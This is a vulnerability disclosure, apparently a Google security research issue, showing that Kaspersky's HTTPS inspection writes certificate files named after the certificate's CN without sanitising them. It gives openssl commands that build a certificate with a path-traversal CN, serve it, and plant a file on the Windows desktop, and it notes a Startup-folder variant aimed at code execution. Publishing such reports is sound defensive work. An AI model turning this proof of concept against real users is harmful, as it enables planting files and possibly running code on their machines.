@@ -1,0 +1,37 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=539
+
+When Kaspersky https inspection is enabled, temporary certificates are created in %PROGRAMDATA% for validation. I observed that the naming pattern  is {CN}.cer.
+
+I created a certificate with CN="../../../../Users/All Users/Start Menu/Startup/foo.bat\x00", browsed to an SSL server presenting that certificate and Kaspersky created that certificate name. Jumping from this to code execution seems quite straightforward. I didn't try it, but it seems quite easy to make some ASN.1/X.509 that is also a valid batch file or some other relaxed-parsing format.
+
+Here is how to generate a certificate to reproduce:
+
+
+$ openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 360
+Generating a 2048 bit RSA private key
+......................................................................+++
+...............+++
+writing new private key to 'key.pem'
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+-----
+You are about to be asked to enter information that will be incorporated
+into your certificate request.
+What you are about to enter is what is called a Distinguished Name or a DN.
+There are quite a few fields but you can leave some blank
+For some fields there will be a default value,
+If you enter '.', the field will be left blank.
+-----
+Country Name (2 letter code) [AU]:
+State or Province Name (full name) [Some-State]:
+Locality Name (eg, city) []:
+Organization Name (eg, company) [Internet Widgits Pty Ltd]:
+Organizational Unit Name (eg, section) []:
+Common Name (e.g. server FQDN or YOUR name) []:../../../../../Users/All Users/Desktop/hello
+Email Address []:
+
+Then test start a server like this:
+
+$ openssl s_server -key key.pem  -cert cert.pem -accept 8080
+
+And then navigate to https://host:8080 from the Windows host, and observe a certificate called hello.cer on the desktop. I attached a screenshot to demonstrate. I can't believe this actually worked, note that it's not necessary to click or interact with anything to produce the file.
